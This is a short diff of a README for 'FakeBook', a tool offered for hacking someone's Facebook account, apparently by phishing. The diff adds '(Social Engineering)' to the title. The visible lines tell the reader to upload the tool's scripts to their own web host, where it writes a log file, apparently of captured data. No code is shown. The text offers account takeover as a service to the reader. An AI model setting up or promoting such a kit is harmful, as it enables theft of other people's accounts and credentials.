@@ -1,5 +1,5 @@
 # FakeBook - JavaScript inject0r
-Hack Someone Facebook With JavaScript inject0r
+Hack Someone Facebook With JavaScript inject0r (Social Engineering)
 
 Upload All the scripts from <strong>https://github.com/aghanathan/FakeBook</strong> into your Web Hosting (e.g. <b>'/public_html/FakeBook'</b>)
 It Will Create a text file ('log.txt') (e.g. <b>http://gofreelancer.xyz/FakeBook/log.txt</b>)
